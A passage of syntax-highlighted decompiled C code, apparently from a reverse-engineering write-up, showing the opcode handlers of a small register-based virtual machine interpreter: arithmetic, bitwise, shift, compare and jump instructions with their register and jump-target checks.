        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">j_strncmp_ifunc</span><span class="token punctuation">(</span>v86<span class="token punctuation">,</span> <span class="token string">"REG"</span><span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        v77 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v86 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">10LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v77 <span class="token operator">></span> <span class="token number">5</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>virtual_machine<span class="token operator">-></span>register0 <span class="token operator">+</span> v63<span class="token punctuation">)</span> <span class="token operator">-=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>virtual_machine<span class="token operator">-></span>register0 <span class="token operator">+</span> v77<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">goto</span> LABEL_193<span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">6LL</span><span class="token operator">:</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">j_strncmp_ifunc</span><span class="token punctuation">(</span>v85<span class="token punctuation">,</span> <span class="token string">"REG"</span><span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        v64 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v85 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">10LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v64 <span class="token operator">></span> <span class="token number">5</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">j_strncmp_ifunc</span><span class="token punctuation">(</span>v86<span class="token punctuation">,</span> <span class="token string">"REG"</span><span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        v78 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v86 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">10LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v78 <span class="token operator">></span> <span class="token number">5</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>virtual_machine<span class="token operator">-></span>register0 <span class="token operator">+</span> v64<span class="token punctuation">)</span> <span class="token operator">*=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>virtual_machine<span class="token operator">-></span>register0 <span class="token operator">+</span> v78<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">goto</span> LABEL_193<span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">7LL</span><span class="token operator">:</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">j_strncmp_ifunc</span><span class="token punctuation">(</span>v85<span class="token punctuation">,</span> <span class="token string">"REG"</span><span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        v65 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v85 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">10LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v65 <span class="token operator">></span> <span class="token number">5</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">j_strncmp_ifunc</span><span class="token punctuation">(</span>v86<span class="token punctuation">,</span> <span class="token string">"REG"</span><span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        v79 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v86 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">10LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v79 <span class="token operator">></span> <span class="token number">5</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>virtual_machine<span class="token operator">-></span>register0 <span class="token operator">+</span> v79<span class="token punctuation">)</span> <span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
          virtual_machine<span class="token operator">-></span>error_code <span class="token operator">=</span> <span class="token number">5LL</span><span class="token punctuation">;</span>
          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"ERROR: Divide by zero!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> virtual_machine<span class="token operator">-></span>error_code<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>virtual_machine<span class="token operator">-></span>register0 <span class="token operator">+</span> v65<span class="token punctuation">)</span> <span class="token operator">/=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>virtual_machine<span class="token operator">-></span>register0 <span class="token operator">+</span> v79<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">goto</span> LABEL_193<span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">8LL</span><span class="token operator">:</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">j_strncmp_ifunc</span><span class="token punctuation">(</span>v85<span class="token punctuation">,</span> <span class="token string">"REG"</span><span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        v66 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v85 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">10LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v66 <span class="token operator">></span> <span class="token number">5</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">j_strncmp_ifunc</span><span class="token punctuation">(</span>v86<span class="token punctuation">,</span> <span class="token string">"REG"</span><span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        v80 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v86 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">10LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v80 <span class="token operator">></span> <span class="token number">5</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>virtual_machine<span class="token operator">-></span>register0 <span class="token operator">+</span> v66<span class="token punctuation">)</span> <span class="token operator">&amp;=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>virtual_machine<span class="token operator">-></span>register0 <span class="token operator">+</span> v80<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">goto</span> LABEL_193<span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">9LL</span><span class="token operator">:</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">j_strncmp_ifunc</span><span class="token punctuation">(</span>v85<span class="token punctuation">,</span> <span class="token string">"REG"</span><span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        v67 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v85 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">10LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v67 <span class="token operator">></span> <span class="token number">5</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">j_strncmp_ifunc</span><span class="token punctuation">(</span>v86<span class="token punctuation">,</span> <span class="token string">"REG"</span><span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        v81 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v86 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">10LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v81 <span class="token operator">></span> <span class="token number">5</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>virtual_machine<span class="token operator">-></span>register0 <span class="token operator">+</span> v67<span class="token punctuation">)</span> <span class="token operator">|=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>virtual_machine<span class="token operator">-></span>register0 <span class="token operator">+</span> v81<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">goto</span> LABEL_193<span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">0xALL</span><span class="token operator">:</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">j_strncmp_ifunc</span><span class="token punctuation">(</span>v85<span class="token punctuation">,</span> <span class="token string">"REG"</span><span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        v68 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v85 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">10LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v68 <span class="token operator">></span> <span class="token number">5</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">j_strncmp_ifunc</span><span class="token punctuation">(</span>v86<span class="token punctuation">,</span> <span class="token string">"REG"</span><span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        v82 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v86 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">10LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v82 <span class="token operator">></span> <span class="token number">5</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>virtual_machine<span class="token operator">-></span>register0 <span class="token operator">+</span> v68<span class="token punctuation">)</span> <span class="token operator">^=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>virtual_machine<span class="token operator">-></span>register0 <span class="token operator">+</span> v82<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">goto</span> LABEL_193<span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">0xBLL</span><span class="token operator">:</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">j_strncmp_ifunc</span><span class="token punctuation">(</span>v85<span class="token punctuation">,</span> <span class="token string">"REG"</span><span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        v69 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v85 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">10LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v69 <span class="token operator">></span> <span class="token number">5</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>virtual_machine<span class="token operator">-></span>register0 <span class="token operator">+</span> v69<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">~</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>virtual_machine<span class="token operator">-></span>register0 <span class="token operator">+</span> v69<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">goto</span> LABEL_193<span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">0xCLL</span><span class="token operator">:</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">j_strncmp_ifunc</span><span class="token punctuation">(</span>v85<span class="token punctuation">,</span> <span class="token string">"REG"</span><span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        v70 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v85 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">10LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v70 <span class="token operator">></span> <span class="token number">5</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>virtual_machine<span class="token operator">-></span>register0 <span class="token operator">+</span> v70<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>v86<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">16LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">goto</span> LABEL_193<span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">0xDLL</span><span class="token operator">:</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">j_strncmp_ifunc</span><span class="token punctuation">(</span>v85<span class="token punctuation">,</span> <span class="token string">"REG"</span><span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        v71 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v85 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">10LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v71 <span class="token operator">></span> <span class="token number">5</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>virtual_machine<span class="token operator">-></span>register0 <span class="token operator">+</span> v71<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>virtual_machine<span class="token operator">-></span>register0 <span class="token operator">+</span> v71<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token function">atoi</span><span class="token punctuation">(</span>v86<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">16LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">goto</span> LABEL_193<span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">0xELL</span><span class="token operator">:</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">j_strncmp_ifunc</span><span class="token punctuation">(</span>v85<span class="token punctuation">,</span> <span class="token string">"REG"</span><span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        v72 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v85 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">10LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v72 <span class="token operator">></span> <span class="token number">5</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">j_strncmp_ifunc</span><span class="token punctuation">(</span>v86<span class="token punctuation">,</span> <span class="token string">"REG"</span><span class="token punctuation">,</span> <span class="token number">3LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        v83 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v86 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">10LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v83 <span class="token operator">></span> <span class="token number">5</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> Error_about_invalid_register<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>virtual_machine<span class="token operator">-></span>register0 <span class="token operator">+</span> v72<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>virtual_machine<span class="token operator">-></span>register0 <span class="token operator">+</span> v83<span class="token punctuation">)</span> <span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
          virtual_machine<span class="token operator">-></span>flags_register <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>virtual_machine<span class="token operator">-></span>register0 <span class="token operator">+</span> v72<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>virtual_machine<span class="token operator">-></span>register0 <span class="token operator">+</span> v83<span class="token punctuation">)</span> <span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
          virtual_machine<span class="token operator">-></span>flags_register <span class="token operator">=</span> <span class="token number">2LL</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span>
        <span class="token punctuation">&#123;</span>
          virtual_machine<span class="token operator">-></span>flags_register <span class="token operator">=</span> <span class="token number">1LL</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">goto</span> LABEL_193<span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">0xFLL</span><span class="token operator">:</span>                               <span class="token comment">// JMP</span>
        v54 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>v85<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">10LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">goto</span> LABEL_168<span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">0x10LL</span><span class="token operator">:</span>                              <span class="token comment">// JE</span>
        v54 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>v85<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">10LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> virtual_machine<span class="token operator">-></span>flags_register <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> LABEL_193<span class="token punctuation">;</span>
        <span class="token keyword">goto</span> LABEL_168<span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">0x11LL</span><span class="token operator">:</span>                              <span class="token comment">// JNE</span>
        v54 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>v85<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">10LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>virtual_machine<span class="token operator">-></span>flags_register <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> LABEL_193<span class="token punctuation">;</span>
LABEL_168<span class="token operator">:</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v54 <span class="token operator">||</span> v54 <span class="token operator">></span> <span class="token number">0xFFF</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> LABEL_179<span class="token punctuation">;</span>
        v55 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
        v56 <span class="token operator">=</span> v54<span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">2</span> <span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span> v55 <span class="token operator">&lt;=</span> <span class="token number">0xFFF</span> <span class="token punctuation">)</span>
          <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span> v56 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>
            <span class="token punctuation">&#123;</span>
              v21 <span class="token operator">=</span> virtual_machine<span class="token operator">-></span>input_data_addr<span class="token punctuation">;</span>
              <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v21 <span class="token operator">+</span> v55<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">10</span> <span class="token punctuation">)</span>
                <span class="token operator">--</span>v56<span class="token punctuation">;</span>
              <span class="token operator">++</span>v55<span class="token punctuation">;</span>
              <span class="token keyword">continue</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token function">LODWORD</span><span class="token punctuation">(</span>v21<span class="token punctuation">)</span> <span class="token operator">=</span> v55<span class="token punctuation">;</span>
            virtual_machine<span class="token operator">-></span>pc_register <span class="token operator">=</span> v55<span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v56 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>
          <span class="token keyword">goto</span> LABEL_193<span class="token punctuation">;</span>
LABEL_179<span class="token operator">:</span>
        virtual_machine<span class="token operator">-></span>error_code <span class="token operator">=</span> <span class="token number">4LL</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"ERROR: Invalid jmp line: %ld!\n"</span><span class="token punctuation">,</span> v54<span class="token punctuation">,</span> v21<span class="token punctuation">,</span> v22<span class="token punctuation">,</span> v23<span class="token punctuation">,</span> v24<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> virtual_machine<span class="token operator">-></span>error_code<span class="token punctuation">;</span>
